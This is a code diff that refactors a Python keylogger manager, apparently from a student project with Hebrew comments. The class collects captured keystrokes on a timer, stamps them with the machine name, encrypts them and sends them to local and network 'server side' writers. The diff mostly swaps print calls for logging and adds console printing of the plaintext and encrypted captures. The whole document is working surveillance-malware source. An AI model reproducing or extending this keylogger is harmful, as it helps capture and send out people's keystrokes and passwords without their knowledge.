@@ -1,11 +1,13 @@
 import threading
+import logging
 from typing import List, Optional
 from datetime import datetime
-from interfaces.IkeyLogger import Ikeylogger
+from interfaces.ikeyLogger import Ikeylogger
 from interfaces.iwriter import IWriter
 from encryption.encryptor import Encryptor
 from config import Config
 
+logging.basicConfig(level=logging.INFO)
 
 class KeyloggerManager:
     def __init__(self, keylogger_service: Ikeylogger, encryptor: Encryptor, file_writer: IWriter = None, network_writer: IWriter=None):
@@ -24,24 +26,24 @@ class KeyloggerManager:
 # פונקציה שמאתחלת את התוכנית 
     def start(self) -> None:
         if self.is_running_flag:
-            print("KeyLoggerManager is already running")
+            logging.warning("KeyLoggerManager is already running")
             return
         self.is_running_flag = True
         self.keylogger_service.start_logging()
         self._schedule_collection()
-        print(f"KeyLoggerManager started with interval {self.update_interval}s")
+        logging.info(f"KeyLoggerManager started with interval {self.update_interval}s")
 
 # פונקציה שמפסיקה את התוכנית
     def stop(self) -> None:
         if not self.is_running_flag:
-            print("KeyLoggerManager is not running")
+            logging.warning("KeyLoggerManager is not running")
             return
         self.is_running_flag = False
         if self.timer:
             self.timer.cancel()
         self.keylogger_service.stop_logging()
         self._collect_and_process()
-        print("KeyLoggerManager stopped")
+        logging.info("KeyLoggerManager stopped")
 
 # בודקת את הזמן
     def _schedule_collection(self) -> None:
@@ -55,12 +57,13 @@ class KeyloggerManager:
             keys = self.keylogger_service.get_logged_keys()
             if keys:
                 # סנן None values
-                filtered_keys = [key for key in keys if key is not None]
                 with self.buffer_lock:
-                    self.buffer.extend(filtered_keys)
+                    self.buffer.extend(keys)
                 self._process_buffer()
+            else:
+                logging.debug("No new keys, skipping write")
         except Exception as e:
-            print(f"Error during collection: {e}")
+            logging.error(f"Error during collection: {e}")
         finally:
             if self.is_running_flag:
                 self._schedule_collection()
@@ -75,30 +78,33 @@ class KeyloggerManager:
                 self.buffer.clear()
 
             data_with_timestamp = self._add_timestamp(raw_data)
+            print("\n--- original Data ---")
+            print(data_with_timestamp)
             encrypted_data = self.encryptor.encrypt(data_with_timestamp)
+
+            # הדפסה של ההצפנה לפני שמירה
+            print("\n--- Encrypted Data ---")
+            print(encrypted_data)
+
             self._send_to_writers(encrypted_data)
             print(f"Processed {len(raw_data)} characters")
+
         except Exception as e:
-            print(f"Error processing buffer: {e}")
+            print(f"Error processing buffer: {e}")
 
 # פונקציה שמוסיפה זמן
     def _add_timestamp(self, data: str) -> str:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        print(data)
         return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
 
 # פונקציה ששולחת לצד שרת
     def _send_to_writers(self, data: str) -> None:
-        if self.file_writer:
-            try:
-                self.file_writer.send_data(data, self.machine_name)
-            except Exception as e:
-                print(f"Error sending to file_writer: {e}")
-        if self.network_writer:
-            try:
-                self.network_writer.send_data(data, self.machine_name)
-            except Exception as e:
-                print(f"Error sending to network_writer: {e}")
+        for writer in [self.file_writer, self. network_writer]:
+            if writer:
+                try:
+                    writer.send_data(data, self.machine_name)
+                except Exception as e:
+                    logging.error(f"Error sending to file_writer: {e}")
 
 # פונקציה שבודקת אורך מידע
     def get_buffer_size(self) -> int:
@@ -114,7 +120,7 @@ class KeyloggerManager:
         if new_interval <= 0:
             raise ValueError("Interval must be positive")
         self.update_interval = new_interval
-        print(f"Update interval changed to {new_interval}s")
+        logging.info(f"Update interval changed to {new_interval}s")
         if self.is_running_flag and self.timer:
             self.timer.cancel()
             self._schedule_collection()
